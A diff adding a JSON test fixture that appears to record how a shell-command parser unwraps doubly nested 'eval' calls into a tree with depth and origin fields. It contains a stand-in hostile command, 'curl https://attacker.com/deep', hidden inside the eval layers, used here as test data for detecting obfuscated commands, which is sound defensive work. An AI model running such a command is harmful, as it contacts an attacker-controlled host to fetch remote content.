@@ -1,0 +1,45 @@
+[
+  {
+    "argv": [
+      "eval",
+      "eval \"curl https://attacker.com/deep\""
+    ],
+    "original": [
+      "eval",
+      "eval \"curl https://attacker.com/deep\""
+    ],
+    "terminator": "NEWLINE",
+    "reentry": [
+      {
+        "argv": [
+          "eval",
+          "curl https://attacker.com/deep"
+        ],
+        "original": [
+          "eval",
+          "curl https://attacker.com/deep"
+        ],
+        "terminator": "NEWLINE",
+        "reentry": [
+          {
+            "argv": [
+              "curl",
+              "https://attacker.com/deep"
+            ],
+            "original": [
+              "curl",
+              "https://attacker.com/deep"
+            ],
+            "terminator": "NEWLINE",
+            "depth": 2,
+            "origin": "eval"
+          }
+        ],
+        "depth": 1,
+        "origin": "eval"
+      }
+    ],
+    "depth": 0,
+    "origin": "top"
+  }
+]
